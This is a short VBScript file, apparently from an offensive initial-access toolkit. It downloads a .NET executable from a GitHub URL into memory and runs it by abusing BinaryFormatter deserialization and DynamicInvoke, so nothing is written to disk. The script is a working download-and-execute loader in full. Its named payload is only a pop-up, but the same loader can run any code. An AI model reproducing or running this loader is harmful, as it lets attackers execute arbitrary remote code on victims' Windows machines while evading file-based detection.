Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"

Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
xHttp.Open "GET", "https://github.com/hegusung/Windows-Initial-Access/raw/main/NET/PopUp.exe", False
xHttp.Send

entry_class = "Program"

Dim ms
Set ms = CreateObject("System.IO.MemoryStream")
ms.Write xHttp.responseBody, 0, UBound(xHttp.responseBody)
ms.Position = 0

Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add Empty

Set d = fmt.Deserialize_2(ms)
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)